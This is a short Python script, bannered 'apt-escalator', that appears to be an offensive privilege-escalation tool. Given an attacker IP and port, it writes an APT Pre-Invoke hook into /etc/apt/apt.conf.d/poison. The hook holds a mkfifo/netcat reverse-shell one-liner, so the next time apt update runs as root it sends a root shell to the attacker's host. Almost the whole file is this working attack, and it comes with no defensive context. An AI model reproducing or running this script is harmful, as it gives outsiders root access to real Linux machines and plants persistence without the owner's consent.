#!/usr/bin/python3

import os
import sys

logo = """
  ____  ____  ______           ___  _____   __   ____  _        ___ ______   ___   ____
 /    ||    \|      |         /  _]/ ___/  /  ] /    || |      /  _]      | /   \ |    ,
|  o  ||  o  )      | _____  /  [_(   \_  /  / |  o  || |     /  [_|      ||     ||  D  )
|     ||   _/|_|  |_||     ||    _]\__  |/  /  |     || |___ |    _]_|  |_||  O  ||    /
|  _  ||  |    |  |  |_____||   [_ /  \ /   \_ |  _  ||     ||   [_  |  |  |     ||    '
|  |  ||  |    |  |         |     |\    \     ||  |  ||     ||     | |  |  |     ||  .  ,
|__|__||__|    |__|         |_____| \___|\____||__|__||_____||_____| |__|   \___/ |__|\_|
"""

if len(sys.argv) != 3:
    print("+-----------------------------------------------+")
    print("[!]NeedMoreArguments")
    print(f"[+]Ex: {sys.argv[0]} <YOUR_IP> <PORT>")
    print("these are need for the reverse_shell")
    print("+-----------------------------------------------+")
    sys.exit()

print(logo)

command = "echo \'apt::Update::Pre-Invoke {\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f\"};\' > /etc/apt/apt.conf.d/poison"

lhost = sys.argv[1]
lport = sys.argv[2]

command = command.replace("{LHOST}",str(lhost))
command = command.replace("{LPORT}",str(lport))

os.system(command)
